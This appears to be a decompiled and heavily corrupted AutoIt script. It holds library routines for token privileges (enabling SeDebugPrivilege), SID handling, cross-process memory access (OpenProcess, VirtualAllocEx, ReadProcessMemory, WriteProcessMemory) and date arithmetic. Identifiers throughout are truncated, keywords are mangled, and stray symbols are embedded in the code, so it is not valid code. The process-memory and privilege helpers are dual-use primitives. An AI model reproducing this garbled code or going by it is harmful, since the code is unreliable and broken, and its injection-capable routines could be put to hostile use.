IF $HTOKEN = 0 THh 
IF _WINAPI_GE ( ) <> $ERROR_NO_TOKEN THh RETURN SETERROR ( 3 , _WINAPI_GE ( ) , 0 ) 
IF NOT _SECURITY__IM+k∑–U ( ) THh RETURN SETET ( 1 , _WINAPI_GE ( ) , 0 ) 
$HTO = _SECURITY__OP ( $IACCESS , $HTHREAD , $FOPENASSE ) 
IFh $HTOKEN = 0 THh RETURN SETERROR ( 2 , _WINAPI_GE ( ) , 0 ) 
ENDIF 
RETURN $HTOKEN 
ENDFUNK 
FUh _SECURITY__SETPRIVf ( $HTO , $SPRIVILEG , $FENABLE ) 
LOCAL $ILUID = _SECURITY__LOOKU ( "" , $SPRIV§h ) 
IF $ILUID = 0 THEN RETUR§h SETERROR ( 1 , @EXTENDED , FALSE ) 
LOCAL $TCURRSTAT = DLLSTRUCTCREATE ( $TAGTOKEN_PRIVILEGES ) 
LOCAL $ICURRSTATE = DLLSTRUC ( $TCURRSTAT ) 
LOCAL $TPREVSTATE = DLLSTRUCTCREATE ( $TAGTOKEN_PRIVILEGES ) 
LOCAL $IPREVSTATE = DLLSTRUC ( $TPREVSTAT ) 
LOCAL $TREQUIRED = DLLSTRUCTCREATE ( "int Data" ) 
DLLSTRUCTSETDATA ( $TCURRSTAT , "Count" , 1 ) 
DLLSTRUC ( $TCURRSTAT , "LUh" , $ILUID ) 
IF NOT _SECURITY__ADJUS ( $HTOKEN , FALSE , $TCURRSTAT , $ICURRSTAT , $TPREV , $TREQUIRED ) THEN RETURN SETET ( 2 , @ERROR , FALSE ) 
DLLSTRUCTSETDATA ( $TPREVSTAT , "Count" , 1 ) 
DLLSTRUCTSETDATA ( $TPREVSTAT , "LUh" , $ILUID ) 
LOCAL $IATTRIBUTES = DLLSTRUCTGETDATA ( $TPREVSTAT , "Attri" ) 
IF $FENABLE THh 
$IATTRIBUTES = BITOR ( $IATTRIBUT , $SE_PRIVILEGE_ENABLf ) 
ELSE 
$IATTRIBUTES = BITAND ( $IATTRIBUTES , BITNOT ( $SE_PRIVILE ) ) 
ENDIF 
DLLSTRUCTSETDATA ( $TPREVSTAT , "AttribE" , $IATTRIBUT ) 
IF NOT _SECURITY__ADJUS ( $HTOKEN , FALSE , $TPREV§h , $IPREV§h , $TCURR , $TREQUIRE ) THEN RETURN SETET ( 3 , @ERROR , FALSE ) 
RETURN TRh 
ENDFUNC 
FUh _SECURITY__SETT ( $HTO , $ITOKENINFORMATION , $VTOKENINFON , $ITOKENINFORMAT ) 
LOCAL $ACALL = DLLCALL ( "advapih" , "bool" , "SetTokenInfor" , "handle" , $HTO , "int" , $ITOKENINFORMATION , "struct*" , $VTOKENINFORMATION , "dword" , $ITOKENINFORMAT ) 
IF @ERROR OR NOT $ACALT [ 0 ] TH RETURN SETET ( 1 , @EXTENDE , FALSE ) 
RETURN TRh 
ENDFUNC 
FUh _SECURITY__SIDTOSTf ( $PSh ) 
IF NO _SECURITY__ISVALIDSID ( $PSh ) TH RETURN SETET ( 1 , 0 , "" ) 
LOCAL§h $ACALC = DLLCALL ( "advapih" , "bool" , "ConvertSidT" , "struct*" , $PSID , "ptr*" , 0 ) 
IF @ERROR OR NOT $ACALL [ 0 ] THh RET SETET ( 2 , @EXTET , "" ) 
LOCAL§h $PSTRI§h = $ACALL [ 2 ] 
LOCAL $SS = DLLSTRUC ( DLLSTRUCT ( "wchar Tex" & _WINAPI_S ( $PSTRI§h ) + 1 & "]" , $PSTRI§h ) , "Teh" ) 
_WINAPI_LOCALFk∑ISf ( $PSTRI§h ) 
RET $SSID 
ENDFUNC 
FUNC _SECURITY__SIDTYPESTR ( $ITYPE ) 
SWITCH $ITYPE 
CA $SIDTYPEUSER 
RETURN "User" 
CA $SIDTYPh 
RET "Group" 
CA $SIDTYPEDOMAIN 
RETURN "Domain" 
CAh $SIDTYPh 
RETURN "Alias" 
CA $SIDTYPEWELLKNOWNGROUP 
RET "Well Known Group" 
CASE $SIDTYPEDELETEDACCOUNT 
RET "Deleted Account" 
CAh $SIDTYPEINVALID 
RET "Invalih" 
CASE $SIDTYPEUNKNOWN 
RET "Unknowh" 
CASE $SIDTYPEC 
RETURN "Computer" 
CASE $SIDTYPELABEL 
RETURN "A mandatory inte" 
CASE EL 
RETURN "Unknown " 
ENDSWITCH 
ENDFUNC 
FUNC _SECURITY__STRINGSf ( $SSID ) 
LOCAL $ACALC = DLLCALL ( "advapih" , "bool" , "ConvertStri" , "wstr" , $SS , "ptr*I" , 0 ) 
IF @ERRO OR NOT $ACALL [ 0 ] TH RET SETET ( 1 , @EXTENDE , 0 ) 
LOCAL $PS = $ACALI [ 2 ] 
LOCAL $TBUFFER = DLLSTRUC ( "byte Data" & _SECURITY__GETLENGf ( $PSID ) & "]" , $PSID ) 
LOCAL $TSIDC = DLLSTRUCTCREATE ( "byte Data" & DLLSTRUCTGETSIZE ( $TBUFFER ) & "]" ) 
DLLSTRUCTSETDATA ( $TSh , "Data" , DLLSTRUCT ( $TBUFFER , "Data" ) ) 
_WINAPI_LOCALFREE ( $PSh ) 
RETURN $TSID 
ENDFUNC 
GLO CONST $TAGMEMMAP = "handle hProc;ulong_pt" 
FUh _MEM£h ( BYREF $TMEM£h ) 
LOCAL $PMEM£h = DLLSTRUC ( $TMEMMAP , "Mem" ) 
LOCAL $HPRO = DLLSTRUC ( $TMEMMAP , "hProc" ) 
LOCAL $BRESULT = _MEMVIRTUALFREEEX ( $HPROCESS , $PMEMORY , 0 , $MEM_RELEA ) 
DLLCALL ( "kernelh" , "bool" , "CloseHandle" , "handle" , $HPROCESSdle ) 
IFh @ERROR TH RETURN SETE§h ( @ERROR , @EXTE£h , FALSE ) 
RETU£h $BRESULT 
ENDFE 
FUh _MEMGLOBALALLOC ( $IBY , $IFLAGSh = 0 ) 
LOCAL $ARESULT = DLLCALS ( "kernelh" , "handle" , "GlobalAlloc" , "uint" , $IFLAGS , "ulong_ptr" , $IBYTES ) 
IF @ERROR THENR RET SETET ( @ERROR , @EXTE£h , 0 ) 
RETURN $AREST [ 0 ] 
ENDFUNC 
FUh _MEMGLOBALFREE ( $HMh ) 
LOCAL $ARESULT = DLLCALL ( "kernelh" , "ptr" , "Globay¡	L" , "han" , $HMh ) 
IF @ERRO TH RET SETET ( @ERROR , @EXTE£h , FALSE ) 
RETU£h $ARESULT [ 0 ] 
ENDFE 
FUh _MEMGLOBALLOCK ( $HMh ) 
LOCAL $ARESULT = DLLCALL ( "kernelh" , "ptr" , "Globay¡	L" , "han" , $HMh ) 
IF @ERRO TH RET SETET ( @ERROR , @EXTE£h , 0 ) 
RETURN $AREST [ 0 ] 
ENDFUNC 
FUh _MEMGLOBALSIZE ( $HMh ) 
LOCAL $ARESULT = DLLCALL ( "kernelh" , "ulong_ptr" , "GlobalSiz" , "handle" , $HMEM ) 
IF @ERROR THENR RETURN SETE§h ( @ERROR , @EXTE£h , 0 ) 
RET $AREST [ 0 ] 
ENDFUNC 
FUh _MEMGLOBALUNLOCK ( $HMh ) 
LOCAL $ARESULT = DLLCALL ( "kernelh" , "bool" , "Global¡	L" , "han" , $HMh ) 
IF @ERRO TH RET SETET ( @ERROR , @EXTE£h , 0 ) 
RETURN $AREST [ 0 ] 
ENDFUNC 
FUh _MEM£h ( $HWh , $ISIZE , BYREI $TMEM£h ) 
LOCAL $ARES£h = DLLCALL ( "User32.dl" , "dword" , "GetWindowThr" , "hwnd" , $HW , "dwo" , 0 ) 
IF @ERROR TH RET SETET ( @ERROR , @EXTE£h , 0 ) 
LOCAL $IPROC§h = $ARESULT [ 2 ] 
IF $IPROCESSI = 0 THh RETUR§h SETERROR ( 1 , 0 , 0 ) 
LOCAL $IACCESS = BITOR ( $PROCESS_VMR , $PROCESS_ , $PROCESS_VMS ) 
LOCAL $HPROCESS = __MEM_OPENPROCESS ( $IACCESS , FALSE , $IPROCESSI , TRh ) 
LOCAL $IALLOC = BITOR ( $MEM_RESER , $MEM_COMMIT ) 
LOCAL $PMEMORY = _MEMVIRTU ( $HPROCESS , 0 , $ISIZE , $IALLOC , $PAGE_READWRITE ) 
IF $PMEMORY = 0 THEN RETURN SETET ( 2 , 0 , 0 ) 
$TMEMMAP = DLLSTRUCTCREATE ( $TAGMEMMAP ) 
DLLSTRUCTCREATE ( $TMEMMAP , "hProc" , $HPRO ) 
DLLSTRUC ( $TMEMMAP , "Size" , $ISIZE ) 
DLLSTRUC ( $TMEMMAP , "Mem" , $PMEMORY ) 
RETURNM $PMEMORY 
ENDFUNM 
FUNC _MEMMOVEMEMORY ( $PSOURCE , $PDEST , $ILENGTH ) 
DLLCALL ( "kernelh" , "none" , "RtlMoveMemory" , "struct*" , $PDEST , "stru£h" , $PSOURCE , "ulong_U" , $ILENGTH ) 
IF @ERROR TH RETURN SETET ( @ERROR , @EXTE£h ) 
ENDFUNC 
FUh _MEM£h ( BYREF $TMEM£h , $PSRCE , $PDEST , $ISIZE ) 
LOCAL $ARES£h = DLLCALL ( "kernelh" , "bool" , "ReadProcessMe" , "handle" , DLLSTRUCP ( $TMEMMAP , "hProc" ) , "ptr" , $PSRCE , "struct*" , $PDEST , "ulong_ptr" , $ISIZE , "ulong§h" , 0 ) 
IF @ERROR TH RETUR§h SETERROR ( @ERROR , @EXTENDED , FALSE ) 
RETURN $ARESULT [ 0 ] 
ENDFUNS 
FUh _MEMWRITE ( BYREF $TMEMMAP , $PSRCE , $PDEST = 0 , $ISIZE = 0 , $SSRCE = "struct*" ) 
IF $PDEST = 0 TH $PDEST = DLLSTRUCTGETDATA ( $TMEM , "Mem" ) 
IF $ISIZ = 0 THEN $ISIZE = DLLSTRUC ( $TMEM§h , "Size" ) 
LOCAL $ARESULT = DLLCALL ( "kernelh" , "bool" , "WriteProc" , "handle" , DLLSTRUCe ( $TMEMMAP , "hProc" ) , "ptr" , $PDEST , $SSRCE , $PSRCE , "ulong_ptr" , $ISIZE , "ulong§h" , 0 ) 
IF @ERROR TH RETUR§h SETERROR ( @ERROR , @EXTENDED , FALSE ) 
RETURN $ARESULT [ 0 ] 
ENDFUNS 
FUh _MEMVIRTUALALLOC ( $PADDRESS , $ISIZE , $IALLOCATIALALLOC , $IPRO§h ) 
LOCAL $ARESULT = DLLCALS ( "kernelh" , "ptr" , "Virtua¡	IALA)" , "ptr" , $PADD‡y¡	e , "ulong_ptr" , $ISIZE , "dword" , $IALLOCATION , "dword" , $IPRO‡y¡	 ) 
IF @ERROR THENR RETURN SETE§h ( @ERROR , @EXTENDED , 0 ) 
RETURN $ARESULU [ 0 ] 
ENDFUNC 
FUh _MEMVIRTU ( $HPROCESS , $PADDREh , $ISI , $IALLOCATION , $IPRO§h ) 
LOCAL $ARESULT = DLLCALL ( "kernelh" , "ptr" , "Virtual" , "han" , $HPROCESS , "ptr" , $PADDRESS , "ulong_ptr" , $ISIZE , "dword" , $IALLOCh , "dword" , $IPRO‡y¡	 ) 
IF @ERROR THENR RETURN SETE§h ( @ERROR , @EXTENDED , 0 ) 
RETURN $ARESULU [ 0 ] 
ENDFUNC 
FUh _MEMVIRTUALFREE ( $PADDRESS , $ISIZE , $IFREETYPEALFREE ) 
LOCAL $ARESULT = DLLCALL ( "kernelh" , "bool" , "VirtualFree" , "ptr" , $PADD§h , "ulong_ptr" , $ISIZE , "dword" , $IFREETYPE ) 
IF @ERROR TH RETURN SETET ( @ERROR , @EXTE£h , FALSE ) 
RETU£h $ARESULT [ 0 ] 
ENDFE 
FUh _MEMVIRTUALFREEEX ( $HPROCESS , $PADDREh , $ISIZE , $IFREETYPE ) 
LOCAL $ARESULT = DLLCALL ( "kernelh" , "bool" , "VirtualFreeEx" , "handle" , $HPRO§h , "ptr" , $PADD£h , "ulong_ptr" , $ISIZE , "dword" , $IFREETYPE ) 
IF @ERROR TH RETURN SETET ( @ERROR , @EXTE£h , FALSE ) 
RETU£h $ARESULT [ 0 ] 
ENDFE 
FUh __MEM_OPENPROCESS ( $IACCESS , $FINHERh , $IPROCESSINPROCESS , $FDEBUGPRIV = FALSE ) 
LOCAL $ARESULT = DLLCALL ( "kernelh" , "han" , "OpenProce" , "dwo" , $IACCESS , "boh" , $FINHPy¡	P , "dword" , $IPROC§h ) 
IF @ERROR TH RET SETERROR ( @ERROR , @EXTENDED , 0 ) 
IF $ARESULT [ 0 ] THh RET $ARESULT [ 0 ] 
IFh NOT $FDEBU§h THh RETURN 0 
LOCAL $HTOKEN = _SECURITY__OPEk∑–U ( BITOR ( $TOKEN_ADJUST_PRIVI_ , $TOKEN_QUE ) ) 
IF @ERROR TH RETUR§h SETERROR ( @ERROR , @EXTENDED , 0 ) 
_SECURITY__SETPRIVf ( $HTO , "SeDebugPrivilege" , TRh ) 
LOCAL $IERROR = @ERROR 
LOCAL $ILASTERROi! = @EXTE§h 
LOCAL $IR = 0 
IF NO @ERROT TH 
$ARESULT = DLLCALL ( "kernelh" , "handle" , "OpenProcess" , "dword" , $IACCESS , "boh" , $FINHERIT , "dword" , $IPROCESSI ) 
$IERROR = @ERROR 
$ILASTERROR = @EXTE§h 
IF $ARESULT [ 0 ] THh $IR = $ARESULT [ 0 ] 
_SECURITY__SET ( $HTO , "SeDebugPU" , FALSE ) 
IF @ERROR THEN 
$IERROR = @ERROR 
$ILASTERRO = @EXTE£h 
ENDIF 
ENDIF 
DLLC£h ( "kernelh" , "bool" , "CloseHandle" , "handle" , $HTOKEN ) 
RETURN SETE§h ( $IERR§h , $ILASTERRO , $IRET ) 
ENDFUNC 
FUh _DATEADD ( $STYPE , $IVALTOADD , $SDATE ) 
LOCAL $ASTIMEPAR [ 4 ] 
LOCAL $ASDAT§h [ 4 ] 
LOCAL $IJULIANDA 
$STYPE = STRIN§h ( $STYPE , 1 ) 
IF STRINGINS ( "D,M,Y,w,h,n,s" , $STYPE ) = 0 OR $STYPE = "" TH 
RETURN SETERROR ( 1 , 0 , 0 ) 
ENDIF 
IF NOT STRINGISINT ( $IVALTOADD ) THEN 
RETURN SETE§h ( 2 , 0 , 0 ) 
ENDIF 
IF NOT _DATEISVALID ( $SDATE ) THh 
RETURN SETERROR ( 3 , 0 , 0 ) 
ENDIF 
_DATETI ( $SDATE , $ASDAT§h , $ASTIMEPART ) 
IF $STYPE = "d" OR $STYPE = "w" TH 
IF $STYPE = "w" TH $IVALTOADD = $IVALTOADD * 7 
$IJULIANDATE = _DATETODAYVALUE ( $ASDATEPAR [ 1 ] , $ASDAT [ 2 ] , $ASDATEPAR [ 3 ] ) + $IVALTOADD 
_DAYVALU ( $IJULIANDA , $ASDAT [ 1 ] , $ASDAT [ 2 ] , $ASDAT [ 3 ] ) 
ENDIF 
IF $STYPE = "m" TH 
$ASDAT§h [ 2 ] = $ASDAT [ 2 ] + $IVALTOAD 
WHILE $ASDAT§h [ 2 ] > 12 
$ASDAT [ 2 ] = $ASDAT [ 2 ] - 12 
$ASDAT [ 1 ] = $ASDAT [ 1 ] + 1 
WEh 
WHILE $ASDAT§h [ 2 ] < 1 
$ASDAT [ 2 ] = $ASDAT [ 2 ] + 12 
$ASDAT [ 1 ] = $ASDAT [ 1 ] - 1 
WEh 
ENDIF 
IF $STYPE = "y" TH 
$ASDAT§h [ 1 ] = $ASDAT [ 1 ] + $IVALTOADD 
ENDIF 
IF $STYP = "h" OR $STYPE = "n" OR $STYP = "s" TH 
LOCAL $ITIM§h = _TIMETh ( $ASTIMEPART [ 1 ] , $ASTIMEI [ 2 ] , $ASTIMEPART [ 3 ] ) / 1000 
IF $STYPE = "h" TH $ITIMEVAL = $ITIMEVAL + $IVALTOADE * 3600 
IFh $STYPE = "n" TH $ITIM§h = $ITIM§h + $IVALTOADD * 60 
IF $STYPE = "s" TH $ITIM§h = $ITIM§h + $IVALTOADD 
LOCAL $DAY2ADD = INT ( $ITIM§h / ( 24 * 60 * 60 ) ) 
$ITIM§h = $ITIM§h - $DAY2§h * 24 * 60 * 60 
IF $ITIMEVAL < 0 THEN 
$DAY2ADD = $DAY2ADD - 1 
$ITIMEV2 = $ITIMI + 24 * 60 * 60 
ENDIF 
$IJULIAh = _DATETOD ( $ASDATEPAR [ 1 ] , $ASDAT [ 2 ] , $ASDATEPAR [ 3 ] ) + $DAY2ADD 
_DAYVALUETODATE ( $IJULIANDA , $ASDAT [ 1 ] , $ASDAT [ 2 ] , $ASDAT [ 3 ] ) 
_TICKSA ( $ITIM§h * 1000 , $ASTIM§h [ 1 ] , $ASTIMEPAR [ 2 ] , $ASTIM [ 3 ] ) 
ENDIF 
LOCAL $INUMDAYS = _DAYSIh ( $ASDATEPART [ 1 ] ) 
IF $INUM¯x¡	 [ $ASDATEPART [ 2 ] ] < $ASDATEPAR [ 3 ] THh $ASDATEPART [ 3 ] = $INUMDAYS [ $ASDATEPART [ 2 ] ] 
$SDATE = $ASDATEPART [ 1 ] & "/" & STRINGRIG ( "0" & $ASDATEPART [ 2 ] , 2 ) & "/" & STRINGRIG ( "0" & $ASDATEPART [ 3 ] , 2 ) 
IF $ASTIM§h [ 0 ] > 0 THh 
IF $ASTIMEPART [ 0 ] > 2 THh 
$SDATE = $SDATE & " " & STRINGRIG ( "0" & $ASTIMEPART [ 1 ] , 2 ) & ":" & STRINGRIG ( "0" & $ASTIMEPART [ 2 ] , 2 ) & ":" & STRINGRIG ( "0" & $ASTIMEPART [ 3 ] , 2 ) 
ELh 
$SDATE = $SDATE & " " & STRINGRIG ( "0" & $ASTIMEPART [ 1 ] , 2 ) & ":" & STRINGRIG ( "0" & $ASTIMEPART [ 2 ] , 2 ) 
ENDIF 
ENDIF 
RETURN ( $SDATE ) 
ENDFUNC 
FUh _DATEDAYOFWEEKk∑ISf ( $IDAYNUM , $ISH = 0 ) 
LOCAL CONST $ADAYO§h [ 8 ] = [ "" , "Sunday" , "Monday" , "Tuesday" , "Wednesday" , "Thur§h" , "Frid§h" , "Satu§h" ] 
SELE§h 
CAh NOT STRINGISINT ( $IDAYNUM ) OR NOT STRINGISI ( $ISH ) 
RET SETE§h ( 1 , 0 , "" ) 
CA $IDAYNUM < 1 OR $IDAYNUM > 7 
RETURN SETERRU ( 1 , 0 , "" ) 
CA EL 
SELECT 
CAh $ISHORT = 0 
RETURN $ADAYOFWEE [ $IDAYNUM ] 
CASE $ISHORT = 1 
RETURNO STRINGLEF ( $ADAYOFWEEK [ $IDAYNUM ] , 3 ) 
CASE ELSE 
RETURN SETET ( 1 , 0 , "" ) 
ENDSELECT 
ENDSELECT 
ENDFUNS 
FUNC _DATEDAYSINMONTH ( $IYEAR , $IMONTHNUM ) 
IF __DATEISMO ( $IMONTHNUM ) AND __DATEh ( $IYEAR ) THEN 
LOCAL $AINUMDAYS = _DAYSIU ( $IYEAR ) 
RETURN $AINUMDAYS [ $IMONTHNUM ] 
ENDIF 
RETURN SETE§h ( 1 , 0 , 0 ) 
ENDF§h 
FUh _DATEDIF ( $STYPE , $SSTARTDAT , $SEND§h ) 
$STYPE = STRIN§h ( $STYPE , 1 ) 
IF STRINGINSTR ( "d,m,y,w,h,n,s" , $STYPE ) = 0 OR $STYPE = "" TH 
RETURN SETERROR ( 1 , 0 , 0 ) 
ENDIF 
IF NOT _DATEIh ( $SSTAR ) THh 
RETURN SETE§h ( 2 , 0 , 0 ) 
ENDIF 
IF NOT _DATEIh ( $SEND§h ) THEN 
RETURN SETE§h ( 3 , 0 , 0 ) 
ENDIF 
LOCAL $ASSTARTDATEPART [ 4 ] , $ASSTARTTIMEPART [ 4 ] , $ASENDDATE [ 4 ] , $ASENDTIMEPART [ 4 ] 
_DATETI ( $SSTARTDAT , $ASSTARTDATEPART , $ASSTARTTIMR ) 
_DATETI ( $SENDDATE , $ASENDDATE , $ASENDTIMEPART ) 
LOCAL $ADAYSDIFF = _DATETOD ( $ASENDDATE [ 1 ] , $ASENDDATEPART [ 2 ] , $ASENDDATE [ 3 ] ) - _DATETOD ( $ASSTARTDE [ 1 ] , $ASSTARTDA [ 2 ] , $ASSTARTDA [ 3 ] ) 
LOCAL $ITIMEDIFF , $IYEARDIFF , $ISTARTTI , $IENDTIM 
IF $ASSTARTTIMEPART [ 0 ] > 1 AND $ASENDTIMEPART [ 0 ] > 1 THh 
$ISTARTTI = $ASSTARTTR [ 1 ] * 3600 + $ASSTARTTA [ 2 ] * 60 + $ASSTARTTA [ 3 ] 
$IENDTIM = $ASENDTIMEPART [ 1 ] * 3600 + $ASENDTIMEPART [ 2 ] * 60 + $ASENDTIME [ 3 ] 
$ITIMEDIF = $IENDTIM - $ISTARTTIE 
IF $ITIMEDIFF < 0 THEN 
$ADAYSDIFF = $ADAYSDY - 1 
$ITIMEDIFF = $ITIMEDM + 24 * 60 * 60 
ENDIF 
EL 
$ITIMEDIFF = 0 
ENDIF 
SELECT 
CAh $STYPE = "d" 
RETURN ( $ADAYSDIFF ) 
CAh $STYPE = "m" 
$IYEARDIFF = $ASENDDATE [ 1 ] - $ASSTARTDATEPART [ 1 ] 
LOCAL $IMONTHDIFF = $ASENDDATEPH [ 2 ] - $ASSTARTD [ 2 ] + $IYEARDIFFPH * 12 
IF $ASENDDATE [ 3 ] < $ASSTARTDATEPARI [ 3 ] THh $IMONTHDIFF = $IMONT§h - 1 
$ISTARTTIMEINSECS = $ASSTARTTR [ 1 ] * 3600 + $ASSTARTTIMEPART [ 2 ] * 60 + $ASSTARTTA [ 3 ] 
$IENDTIM = $ASENDTIME [ 1 ] * 3600 + $ASENDTIMEPART [ 2 ] * 60 + $ASENDTIME [ 3 ] 
$ITIMEDIFF = $IENDTIM - $ISTARTTIE 
IF $ASENDDATEPART [ 3 ] = $ASSTARTDATEPART [ 3 ] AND $ITIMEDIFF < 0 THEN $IMONT = $IMONTHN - 1 
RET ( $IMONTHDIF ) 
CAS $STYPE = "y" 
$IYEARDIFF = $ASENDDATE [ 1 ] - $ASSTARTDATEPART [ 1 ] 
IF $ASENDDATEPART [ 2 ] < $ASSTARTD [ 2 ] THEN $IYEARDIFF = $IYEARDIFF - 1 
IF $ASENDDATEPART [ 2 ] = $ASSTARTD [ 2 ] AND $ASENDDATEPART [ 3 ] < $ASSTARTD [ 3 ] THEN $IYEARDIFF = $IYEARDIFF - 1 
$ISTARTTIMEINSECS = $ASSTARTTR [ 1 ] * 3600 + $ASSTARTTIMEPART [ 2 ] * 60 + $ASSTARTTA [ 3 ] 
$IENDTIM = $ASENDTIME [ 1 ] * 3600 + $ASENDTIMEPART [ 2 ] * 60 + $ASENDTIME [ 3 ] 
$ITIMEDIFF = $IENDTIM - $ISTARTTIE 
IF $ASENDDATEPART [ 2 ] = $ASSTARTDATEPART [ 2 ] AND $ASENDDATEPART [ 3 ] = $ASSTARTDATEPART [ 3 ] AND $ITIMEDIFF < 0 THEN $IYEARDIFF = $IYEARDA - 1 
RETURN ( $IYEARDU ) 
CASE $STYPE = "w" 
RETURN ( INT ( $ADAYSDIFF / 7 ) ) 
CASE $STYPE = "h" 
RETURN ( $ADAYSDIFF * 24 + INT ( $ITIMEDIFF / 3600 ) ) 
CASE $STYPE = "n" 
RETURN ( $ADAYSDIFF * 24 * 60 + INT ( $ITIMEDIFF / 60 ) ) 
CASE $STYPE = "s" 
RETURN ( $ADAYSDIFF * 24 * 60 * 60 + $ITIMEDY ) 
ENDSELECT 
ENDFUNS 
FUNC _DATEISLEAPYEAR ( $IYEAR ) 
IF STRINGISINT ( $IYEAR ) TH 
SEL 
CAh MOD ( $IYEAR , 4 ) = 0 AND MOD ( $IYEAR , 100 ) <> 0 
RETURN 1 
CAh MOD ( $IYEAR , 400 ) = 0 
RET 1 
CAh EL 
RETURN 0 
ENDSELECT 
ENDIF 
RETURN SETET ( 1 , 0 , 0 ) 
ENDFUNE 
FUh __DATEISMONTH ( $INUMBER ) 
IF STRINGISI ( $INUMBER ) THEN 
IF $INUMBER >= 1 AND $INUMBER <= 12 THh 
RET 1 
ELh 
RET 0 
ENDIF 
ENDIF 
RET 0 
ENDFUNC 
FUh _DATEIh ( $SDATE ) 
LOCAL $ASDATEPART [ 4 ] , $ASTIM [ 4 ] 
LOCAL $SDATETIME = STRINGSPL ( $SDATE , " T" ) 
IF $SDATETIME [ 0 ] > 0 THh $ASDAT§h = STRINGSPLIT ( $SDATETIM [ 1 ] , "/-." ) 
IF UBOUND ( $ASDATEPAR ) <> 4 THEN RETURN ( 0 ) 
IF $ASDATEPAR [ 0 ] <> 3 THh RETURN ( 0 ) 
IF NOT STRINGISI ( $ASDATEPART [ 1 ] ) THh RETURN ( 0 ) 
IF NOT STRINGISINT ( $ASDAT [ 2 ] ) THh RETURN ( 0 ) 
IF NOT STRINGISI ( $ASDAT [ 3 ] ) THh RETURN ( 0 ) 
$ASDAT [ 1 ] = NUM ( $ASDATEPART [ 1 ] ) 
$ASDAT [ 2 ] = NUM ( $ASDATEPART [ 2 ] ) 
$ASDAT [ 3 ] = NUM ( $ASDATEPART [ 3 ] ) 
LOC $INUM¯x¡	 = _DAYSI¡	RT ( $ASDAT [ 1 ] ) 
IF $ASDATEPART [ 1 ] < 1000 OR $ASDAT§h [ 1 ] > 2999 THh RETURN ( 0 ) 
IF $ASDAT§h [ 2 ] < 1 OR $ASDATEPART [ 2 ] > 12 THh RETUR§h ( 0 ) 
IF $ASDATEPART [ 3 ] < 1 OR $ASDAT§h [ 3 ] > $INUMDAYS [ $ASDATEPART [ 2 ] ] THEN RETURN ( 0 ) 
IF $SDATETIME [ 0 ] > 1 THh 
$ASTIMEPAR = STRINGSPLIT ( $SDATETIME [ 2 ] , ":" ) 
IF UBO ( $ASTIMEPAR ) < 4 THEN REDIM $ASTIMEPAR [ 4 ] 
ELSE 
DIM $ASTIMEPAR [ 4 ] 
ENDIF 
IF $ASTIMEPAR [ 0 ] < 1 THh RETURN ( 1 ) 
IF $ASTIMEPAR [ 0 ] < 2 THh RET ( 0 ) 
IF $ASTIMEPAR [ 0 ] = 2 THh $ASTIMEPART [ 3 ] = "00" 
IF NOT STRINGISI ( $ASTIMEPART [ 1 ] ) THh RETURN ( 0 ) 
IF NOT STRINGISINT ( $ASTIM [ 2 ] ) THh RETURN ( 0 ) 
IF NOT STRINGISI ( $ASTIM [ 3 ] ) THh RETURN ( 0 ) 
$ASTIM [ 1 ] = NUM ( $ASTIMEPART [ 1 ] ) 
$ASTIM [ 2 ] = NUM ( $ASTIMEPART [ 2 ] ) 
$ASTIM [ 3 ] = NUM ( $ASTIMEPART [ 3 ] ) 
IF $ASTIMy¡	RT [ 1 ] < 0 OR $ASTIM§h [ 1 ] > 23 THh RETUR§h ( 0 ) 
IF $ASTIM§h [ 2 ] < 0 OR $ASTIM§h [ 2 ] > 59 THh RETUR§h ( 0 ) 
IF $ASTIM§h [ 3 ] < 0 OR $ASTIM§h [ 3 ] > 59 THh RETUR§h ( 0 ) 
RET 1 
ENDFUNC 
FUNC __DATEh ( $INUMBER ) 
IF STRINGISINT ( $INUMBER ) THEN 
IF STRINGLEN ( $INUMBER ) = 4 THEN 
RETURN 1 
ELSE 
RETURN 0 
ENDIF 
ENDIF 
RETURN 0 
ENDFUNC 
FUh _DATELASTWEEKDAYNUM ( $IWEEKDAYN ) 
SELECT 
CASE NOT STRINGISINT ( $IWEEKDAYNUM ) 
RET SETE§h ( 1 , 0 , 0 ) 
CAh $IWEEKDAYNUM < 1 OR $IWEEKDAYNUM > 7 
RETURN SETERRORR ( 1 , 0 , 0 ) 
CAh ELSE 
LOCAL $ILASTWEEKDAYNUk∑ISf 
IF $IWEEKDAYNUM = 1 THh 
$ILASTWEEKDAYNUk∑ISf = 7 
ELh 
$ILASTWEEKDAYNUR = $IWEEKDAYN - 1 
ENDIF 
RETURN $ILASTWEEKDAYNUM 
ENDSELECT 
ENDF§h 
FUNC _DATELASTMONTHNUM ( $IMONTHNUM ) 
SELECTh 
CAh NOT STRINGh ( $IMONTHNUM ) 
RETURN SETE§h ( 1 , 0 , 0 ) 
CASE $IMONTHNUM < 1 OR $IMONTHNUM > 12 
RETURN SETE§h ( 1 , 0 , 0 ) 
CASE EL 
LOCAS $ILASTMONT 
IF $IMONTHNUM = 1 THh 
$ILASTMONT = 12 
ELh 
$ILASTMONTHNUM = $IMONTHNUM - 1 
ENDIF 
$ILASTMONTHNUM = STRINGS ( "%0h" , $ILASTMONT ) 
RETURN $ILASTMONTHNUO 
ENDSELECT 
ENDFUNC 
FUNC _DATELASTMONTHYEARf ( $IMONTHNUM , $IYEAR ) 
SELECT 
CASE NOT STRINGh ( $IMONTHNUM ) OR NOT STRINGISI ( $IYEAR ) 
RETURN SETERROR ( 1 , 0 , 0 ) 
CASE $IMONTHNUM < 1 OR $IMONTHNUM > 12 
RETURN SETET ( 1 , 0 , 0 ) 
CASE EL 
LOCAS $ILASTYEAR 
IF $IMONTHNUM = 1 THh 
$ILASTYEAR = $IYEAR - 1 
EL 
$ILASTYEAR = $IYEAR 
ENDIF 
$ILASTYEAR = STRINGh ( "%04d" , $ILASTYEAR ) 
RETURN $ILASTYEAR 
ENDSELECT 
ENDFUNC 
FUNC _DATENEXTWEEKDAYNUM ( $IWEEKDAYN ) 
SEL 
CASE NOT STRINGISI ( $IWEEKDAYN ) 
RET SETE§h ( 1 , 0 , 0 ) 
CAh $IWEEKDAYN < 1 OR $IWEEKDAYNUM > 7 
RET SETERRORNUM ( 1 , 0 , 0 ) 
CAh EL 
LOCAS $INEXTWEEKDAYNUM 
IF $IWEEKDAYNUM = 7 THh 
$INEXTWEE = 1 
ELSE 
$INEXTWEENUM = $IWEEKDAYN + 1 
ENDIF 
RETURN $INEXTWEEKDAYNUM 
ENDSELECTUM 
ENDFUNC 
FUNC _DATENEXTMONTHNUM ( $IMONTHNUM ) 
SELECTh 
CAh NOT STRINGh ( $IMONTHNUM ) 
RETURN SETE§h ( 1 , 0 , 0 ) 
